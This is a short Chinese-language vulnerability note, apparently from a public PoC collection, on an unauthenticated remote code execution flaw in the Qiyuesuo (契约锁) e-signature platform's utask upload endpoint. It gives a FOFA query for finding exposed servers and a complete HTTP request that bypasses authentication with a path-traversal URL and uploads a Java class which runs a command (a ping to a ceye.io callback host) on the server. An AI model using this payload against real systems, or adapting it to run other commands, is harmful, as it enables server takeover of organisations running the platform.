# 契约锁utask存在远程命令执行漏洞

# 一、漏洞简介
Qiyuesuo是一款数字化可信基础服务平台，为组织提供“数字身份、电子签章、印章管控以及数据存证服务”于一体的数字化可信基础解决方案。Qiyuesuo存在前台代码执行漏洞，攻击者可构造恶意请求绕过相关认证调用后台功能造成远程代码执行，控制服务器。

# 二、影响版本
+ 契约锁

# 三、资产测绘
+ fofa`app="契约锁-电子签署平台"`
+ 特征

![1717569204388-1722148f-4f83-4ad5-83a5-33896b546916.png](./img/xMWHR1MX67p3_6_M/1717569204388-1722148f-4f83-4ad5-83a5-33896b546916-819995.png)

# 四、漏洞复现
```http
POST /login/%2E%2E;/utask/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
Connection: close
Content-Length: 498
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Accept-Encoding: gzip


------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Content-Disposition: form-data; name="type";

TIMETASK
------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Content-Disposition: form-data; name="file";filename="qys.jpg"

package qiyuesuo;

import com.qiyuesuo.utask.java.BaseTimerTask;

public class qiyuesuo004 extends BaseTimerTask {
    static {try{Runtime.getRuntime().exec("ping grewuo.ceye.io");}catch (Exception e){}}
}
------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--
```

![1717572143609-4985cd77-e1c6-41c2-a057-c8de47fb3934.png](./img/xMWHR1MX67p3_6_M/1717572143609-4985cd77-e1c6-41c2-a057-c8de47fb3934-647804.png)

![1717572153338-675b3911-cdb4-46dd-87ce-7e9fa803db15.png](./img/xMWHR1MX67p3_6_M/1717572153338-675b3911-cdb4-46dd-87ce-7e9fa803db15-226554.png)



> 更新: 2024-09-13 14:39:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cxxpice0g3tk68ed>